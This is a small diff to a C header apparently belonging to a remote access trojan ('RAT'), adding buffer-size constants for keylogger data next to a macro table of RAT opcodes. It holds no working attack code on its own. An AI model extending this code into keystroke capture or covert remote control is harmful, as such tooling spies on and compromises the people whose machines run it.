@@ -4,8 +4,10 @@
 
 #define RAT_OPCODE_MAX_LEN 3 // max is 255 which is 3 bytes
 #define DEFAULT_BUFLEN 64
+#define DEFAULT_KEYLOG_BUFLEN 256
 
 #define RAT_DATA_SIZE (DEFAULT_BUFLEN - sizeof(ratpacket_t))
+#define RAT_KEYLOG_DATA_SIZE (DEFAULT_KEYLOG_BUFLEN - sizeof(ratpacket_t))
 
 #define FOREACH_RAT_OPCODE                                                     \
   _(ECHO, 0, "Echo")                                                           \
